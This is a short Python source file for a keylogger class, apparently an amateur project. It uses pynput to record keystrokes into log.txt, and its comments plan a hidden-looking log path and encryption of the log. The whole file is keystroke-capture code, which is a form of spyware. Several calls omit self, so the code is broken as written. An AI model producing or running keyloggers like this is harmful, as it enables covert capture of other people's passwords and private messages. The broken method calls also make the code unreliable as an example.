import pynput
import sys

from pathlib import Path
from pynput.keyboard import Key, Listener


class Keylogger:

    count = 0
    keys = []
    caps = False


    #TODO: permission denied, diferent folder?
    #filepath = Path("C:/.log.txt")

    def __init__(self):
        self.count = 0
        self.keys = []
        self.caps = False


    def on_press(self, key):
        #global keys, count

        self.count += 1
        self.keys.append(key)

        #amount of chars to be writen
        if self.count >= 5:
            self.count = 0
            write_file(self.keys)
            self.keys = []

        print(key)


    #key realease Key.esc, exit listener loop (ends program)
    def on_release(self, key):
        if key == Key.esc:
            return False


    #writes to the file log.txt
    def write_file(self, keys):

        #global caps
        
        with open("log.txt", "a") as f:
            for key in self.keys:
                if key == Key.enter:
                    f.write('\n')

                elif key == Key.space:
                    f.write(' ')

                elif key == Key.backspace:
                    f.write('<-')

                elif key == Key.ctrl_l or key == Key.ctrl_r:
                    f.write(' ctrl ')

                elif key == Key.shift_l or key == Key.shift_r:
                    f.write(' shift ')

                elif key == Key.caps_lock:
                    self.caps = not self.caps
                    if self.caps:
                        f.write(' /\CAPS/\ ')
                    else:
                        f.write(' \/CAPS\/ ')

                else:
                    if not self.caps:
                        f.write(str(key).replace("'", ''))
                    else:
                        f.write(str(key).replace("'", '').capitalize())


    #TODO: Maybe add crypt and decrypt on text file

    def run(self):
        #Main loop calls functions
        with Listener(on_press = on_press, on_release = on_release) as listener:
            listener.join()
